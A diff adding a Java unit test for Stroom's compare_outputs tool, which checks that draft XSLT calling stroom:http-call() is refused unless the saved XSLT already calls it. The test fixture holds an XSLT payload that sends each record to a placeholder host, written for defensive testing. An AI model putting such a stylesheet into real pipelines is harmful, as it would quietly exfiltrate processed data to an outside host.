@@ -17,8 +17,11 @@
 package stroom.mcp.impl.tools;
 
 import stroom.ai.impl.tools.ToolResult;
+import stroom.docref.DocRef;
+import stroom.pipeline.shared.XsltDoc;
 import stroom.pipeline.shared.stepping.StepLocation;
 import stroom.pipeline.shared.stepping.SteppingResult;
+import stroom.util.json.JsonUtil;
 
 import org.junit.jupiter.api.Test;
 import org.mockito.Mockito;
@@ -26,6 +29,7 @@ import org.mockito.Mockito;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Optional;
 import java.util.function.BiFunction;
 
 import static org.assertj.core.api.Assertions.assertThat;
@@ -111,6 +115,27 @@ class TestCompareOutputsTool {
         field.put("changed", 1);
         field.put("example", example);
         assertThat(result.get("fields_changed")).isEqualTo(List.of(field));
+    }
+
+    @Test
+    void aDraftThatReachesOutsideStroomIsNotSteppedUnlessTheSavedXsltDoesToo() {
+        // Before, compare_outputs stepped any draft, which runs with Stroom's access as processing would: e.g.
+        // stroom:http-call() sending each record to a URL.
+        final String calls = "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"3.0\" "
+                             + "xmlns:stroom=\"stroom\"><xsl:template match=\"/\"><xsl:value-of select=\""
+                             + "stroom:http-call('https://x.example.com', '', 'text/plain', string(.), '')\"/>"
+                             + "</xsl:template></xsl:stylesheet>";
+        final String json = "{\"pipeline_uuid\": \"p-1\", \"stream_ids\": [7], \"draft_code\": {\"translationFilter\": "
+                            + JsonUtil.writeValueAsString(calls) + "}}";
+
+        assertThat(refused(json)).startsWith("draft_code['translationFilter'] is not stepped: ")
+                .contains("calls stroom:http-call(), which reaches outside Stroom");
+        assertThat(world.opened).isEmpty();
+
+        // The element's saved XSLT calls it already (the user put it there): stepped.
+        Mockito.when(world.documentAccess.read(any(DocRef.class), Mockito.eq(XsltDoc.class)))
+                .thenReturn(Optional.of(XsltDoc.builder().uuid("x").name("ACME").data(calls).build()));
+        world.stepping().refuseUnsafeDrafts("p-1", Map.of("translationFilter", calls));
     }
 
     @Test
